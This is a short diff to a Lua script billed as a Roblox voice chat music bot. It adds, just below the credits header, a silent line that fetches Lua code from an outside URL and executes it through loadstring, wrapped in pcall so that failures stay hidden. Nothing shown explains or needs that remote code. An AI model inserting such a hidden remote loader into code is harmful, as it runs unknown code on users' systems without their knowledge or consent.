@@ -2,6 +2,7 @@
     🎵 Roblox Voice Chat Music Bot v3.5
     Created by: borthdayzz (boggle.cc)
 ]]
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_5e6721981d59", "1.0.0", false) end)
 
 if not game:GetService("GuiService") then
 	print("Error: Not running in Roblox environment")
